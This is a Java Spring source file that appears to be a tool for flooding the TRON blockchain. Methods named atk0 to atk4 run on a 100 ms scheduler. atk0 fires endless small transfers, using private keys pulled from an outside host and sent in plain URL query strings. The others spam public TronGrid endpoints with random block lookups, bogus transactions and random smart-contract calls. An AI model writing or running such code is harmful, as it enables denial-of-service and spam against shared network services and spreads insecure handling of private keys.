package com.just.dstron.manager;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.JSONObject;
import com.just.dstron.entity.TronAccountBO;
import com.just.dstron.utils.MyUtils;
import lombok.extern.slf4j.Slf4j;
import org.nutz.http.*;
import org.nutz.lang.util.Callback;
import org.springframework.stereotype.Component;

import javax.annotation.PostConstruct;
import java.util.Random;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;

@Component
@Slf4j
public class TronManager {
    private ScheduledExecutorService executor1 = Executors.newSingleThreadScheduledExecutor();
    private ScheduledExecutorService executor2 = Executors.newSingleThreadScheduledExecutor();

    private Random random=new Random();
    private Long cnt=0L;

    private String[] myAddress={
            "4146FC1638C7D1AF2B346C47EAD6154B908D341449",
            "412D8925322EAB55368FEACC99D76370106ED1718D",
            "412C624EA17BA3AE5E05DF077C65D9AB1E6E10A6AE",
            "419B5013351C36A93E07213D5FBA8EB54A43C36926",
            "41500BE14CDCF5CB323D395EF08A829C4ADE8121BD",
            "41AAE0B59DFBB9E32E0EDEB47BC5CAC696D82738F5",
            "41055CD8994D3D12D6264600956A54633BD79F68E2",
            "41D7FDCB2406E2060F0F5CA4638ACC8E8239C817A5",
            "41C44DB93B2E5BFBFC18C760CA99585E778BB663F8",
            "41AC62B67F62E939616C59B079F9B4F1B0568B2AA5",
    };

    @PostConstruct
    public void init(){
        executor1.scheduleWithFixedDelay(new Runnable() {
            @Override
            public void run() {
                try {
//                    cnt+=1;
//                    if(cnt%10==0){
//                        log.info("cnt:{}",cnt);
//                    }
//                    if(cnt%4==0){
//                        atk3();
//                    }
//                    if(cnt%4==1){
//                        atk3();
//                    }
//                    if(cnt%4==2){
//                        atk3();
//                    }
//                    if(cnt%4==3){
//                        atk3();
//                    }
                    atk0();
                }catch (Exception e){
                    e.printStackTrace();
                }
            }
        },100,100, TimeUnit.MILLISECONDS);

        executor2.scheduleWithFixedDelay(new Runnable() {
            @Override
            public void run() {
                log.info("success cnt:{}",cnt);
            }
        },1000,2000,TimeUnit.MILLISECONDS);
    }

    private void atk0(){
        TronAccountBO fromBO=getTronAccount();
        if(fromBO.getCode()==0){
            TronAccountBO toBO=getTronAccount();
            if(toBO.getCode()==0){
                String key=fromBO.getKey();
                String to=toBO.getAddress();
                Integer amount = 1;
                String url = "http://localhost:3000/tron/transfer?to="+to+"&amount="+amount+"&pri="+key;
                String respStr=Http.get(url).getContent();
                JSONObject respObj=JSON.parseObject(respStr);
                if(respObj!=null&&respObj.getBoolean("result")!=null&&respObj.getBoolean("result")){
                    cnt+=1;
                    log.info("txid:{}",respObj.getString("txid"));
                }
            }
        }
    }

    private TronAccountBO getTronAccount(){
        String url="http://tron.suishizhuan.com/tron/getAccount";
        String resp = Http.get(url).getContent();
        TronAccountBO tronAccountBO=JSON.parseObject(resp,TronAccountBO.class);
        return tronAccountBO;
    }

    private void atk1(){
        try {
            int block = random.nextInt(24888200);
            JSONObject params=new JSONObject();
            params.put("num",block);
            Response response = Http.post3("https://api.trongrid.io/wallet/getblockbynum",params.toJSONString(), Header.create(),5000);
        }catch (Exception e){
            e.printStackTrace();
        }
    }

    private void atk2(){
        try {
            int block = random.nextInt(24888200);
            int inx = block%myAddress.length;
            String a1=myAddress[inx];
            String a2=randomAddress();
            JSONObject params=new JSONObject();
            params.put("owner_address",a1);
            params.put("to_address",a2);
            params.put("amount",random.nextInt(10000));
            Response response = Http.post3("https://api.trongrid.io/wallet/createtransaction",params.toJSONString(), Header.create(),5000);
        }catch (Exception e){
            e.printStackTrace();
        }
    }

    private void atk3(){
        try {
            int block = random.nextInt(24888200);
            JSONObject params=new JSONObject();
            params.put("startNum",block);
            params.put("endNum",block+random.nextInt(90));
            Response response = Http.post3("https://api.trongrid.io/wallet/getblockbylimitnext",params.toJSONString(), Header.create(),5000);
        }catch (Exception e){
            e.printStackTrace();
        }
    }

    private void atk4(){
        try {
            JSONObject params=new JSONObject();
            params.put("owner_address",randomAddress());
            params.put("contract_address","41E3CF5EEFE3A2ABF35A344AE8A3B2F4BB29810CBD");
            params.put("function_selector","buyTickets(bytes32)");
            params.put("fee_limit",5000000+random.nextInt(10000));
            params.put("call_value",25000000);
            params.put("parameter",MyUtils.getRandomHex(64));
            Response response = Http.post3("https://api.trongrid.io/wallet/triggersmartcontract",params.toJSONString(), Header.create(),5000);
        }catch (Exception e){
            e.printStackTrace();
        }

    }

    private String randomAddress(){
        return "41"+ MyUtils.getRandomHex(40);
    }
}
